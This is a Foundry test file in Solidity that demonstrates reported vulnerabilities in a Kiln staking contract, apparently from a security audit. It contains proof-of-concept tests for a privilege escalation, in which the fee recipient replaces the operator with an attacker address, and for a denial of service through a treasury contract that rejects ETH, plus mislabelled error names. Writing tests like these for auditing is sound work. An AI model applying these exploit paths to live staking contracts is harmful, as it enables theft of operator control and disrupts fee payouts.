// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

import "forge-std/Test.sol";
import "../src/StakingContract.sol";
import "../src/ConsensusLayerFeeDispatcher.sol";
import "../src/ExecutionLayerFeeDispatcher.sol";
import "../src/FeeRecipient.sol";
import "../src/libs/StakingContractStorageLib.sol";

contract RevertingContract {
    receive() external payable {
        revert("I reject ETH");
    }
}

contract KilnStakingTest is Test {
    StakingContract public staking;
    ConsensusLayerFeeDispatcher public clDispatcher;
    ExecutionLayerFeeDispatcher public elDispatcher;
    FeeRecipient public feeRecipientImpl;

    address public admin = address(0xAD);
    address public treasury = address(0x71);
    address public operator = address(0x01);
    address public feeRecipient = address(0x02);
    address public mockDepositContract = address(0x03);

    bytes public mockPubKey =
        hex"00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff";
    bytes public mockSig =
        hex"00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff";

    function setUp() public {
        staking = new StakingContract();
        clDispatcher = new ConsensusLayerFeeDispatcher(0);
        elDispatcher = new ExecutionLayerFeeDispatcher(0);
        feeRecipientImpl = new FeeRecipient();

        vm.prank(admin);
        staking.initialize_1(
            admin,
            treasury,
            mockDepositContract,
            address(elDispatcher),
            address(clDispatcher),
            address(feeRecipientImpl),
            1000, // 10% global fee
            5000, // 50% operator fee (half of global fee)
            10000, // global commission limit BPS
            10000 // operator commission limit BPS
        );

        clDispatcher.initCLD(address(staking));
        elDispatcher.initELD(address(staking));
    }

    /// @dev Test Vulnerability 1: setOperatorAddresses modifier is incorrect
    /// allowing the Fee Recipient to replace the Operator
    function test_vulnerability1_privilege_escalation() public {
        // 1. Admin adds operator
        vm.prank(admin);
        uint256 opIndex = staking.addOperator(operator, feeRecipient);
        assertEq(opIndex, 0);

        // Verify initial addresses
        (address opAddr, address feeRec,,,,,) = staking.getOperator(0);
        assertEq(opAddr, operator);
        assertEq(feeRec, feeRecipient);

        // 2. Fee Recipient acts maliciously and changes the operator to an attacker address
        address attacker = address(0xBAD);
        vm.prank(feeRecipient);
        staking.setOperatorAddresses(0, attacker, attacker);

        // 3. Verify operator has been changed (privilege escalated!)
        (opAddr, feeRec,,,,,) = staking.getOperator(0);
        assertEq(opAddr, attacker);
        assertEq(feeRec, attacker);
    }

    /// @dev Test Vulnerability 3 & 2: Swapped custom error revert names
    /// and Denial of Service in dispatch when recipient reverts
    function test_vulnerability2_3_swapped_errors_and_dos() public {
        // Setup reverting treasury contract
        RevertingContract badTreasury = new RevertingContract();

        // Redeploy staking contract with reverting treasury
        StakingContract stakingWithBadTreasury = new StakingContract();
        vm.prank(admin);
        stakingWithBadTreasury.initialize_1(
            admin,
            address(badTreasury),
            mockDepositContract,
            address(elDispatcher),
            address(clDispatcher),
            address(feeRecipientImpl),
            1000, // 10% global fee
            5000, // 50% operator fee
            10000,
            10000
        );

        // Register operator
        vm.prank(admin);
        stakingWithBadTreasury.addOperator(operator, feeRecipient);

        // Set up dispatcher for this staking contract
        bytes32 pubKeyRoot = sha256(abi.encodePacked(mockPubKey, bytes16(0)));
        vm.mockCall(address(stakingWithBadTreasury), abi.encodeWithSignature("getGlobalFee()"), abi.encode(1000));
        vm.mockCall(address(stakingWithBadTreasury), abi.encodeWithSignature("getOperatorFee()"), abi.encode(5000));
        vm.mockCall(
            address(stakingWithBadTreasury), abi.encodeWithSignature("getTreasury()"), abi.encode(address(badTreasury))
        );
        vm.mockCall(
            address(stakingWithBadTreasury),
            abi.encodeWithSignature("getOperatorFeeRecipient(bytes32)", pubKeyRoot),
            abi.encode(feeRecipient)
        );
        vm.mockCall(
            address(stakingWithBadTreasury),
            abi.encodeWithSignature("getWithdrawerFromPublicKeyRoot(bytes32)", pubKeyRoot),
            abi.encode(address(0x111)) // standard address
        );

        // Redeploy elDispatcher pointing to stakingWithBadTreasury
        ExecutionLayerFeeDispatcher elDispWithBadTreasury = new ExecutionLayerFeeDispatcher(0);
        elDispWithBadTreasury.initELD(address(stakingWithBadTreasury));

        // Send 1 ETH to dispatcher to simulate fees received
        vm.deal(address(elDispWithBadTreasury), 1 ether);

        // The expected inner revert data from badTreasury
        bytes memory expectedInnerRevertData = abi.encodeWithSignature("Error(string)", "I reject ETH");

        // Expect revert due to badTreasury rejecting ETH
        // The error name should be related to Treasury, but because of swapped errors,
        // it reverts with FeeRecipientReceiveError!
        vm.expectRevert(
            abi.encodeWithSelector(
                ExecutionLayerFeeDispatcher.FeeRecipientReceiveError.selector, expectedInnerRevertData
            )
        );
        elDispWithBadTreasury.dispatch(pubKeyRoot);
    }
}
